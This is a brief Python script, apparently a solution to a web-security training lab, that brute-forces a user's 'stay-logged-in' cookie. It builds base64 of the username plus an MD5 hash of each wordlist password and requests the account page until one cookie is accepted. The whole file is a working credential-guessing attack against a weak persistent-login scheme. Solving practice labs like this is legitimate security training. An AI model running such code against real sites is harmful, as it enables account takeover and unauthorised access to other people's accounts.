from http import cookies
import requests
import hashlib
import base64

url = 'https://acf71f291f6306a3c0257f7100e100bc.web-security-academy.net/my-account'

def getPassword():
    passwords = open('../../wordlist/password.txt')

    for password in passwords:
        m =  hashlib.md5()
        m.update(password.replace('\n', '').encode('utf-8'))
        stay_logged_in = str(base64.b64encode(('carlos:' + str(m.hexdigest())).encode()).decode())

        response = requests.get(url, cookies={
            'stay-logged-in': stay_logged_in
        }, allow_redirects=False)

        if response.text != '':
            print(response.text)
            print(stay_logged_in)
            break

getPassword()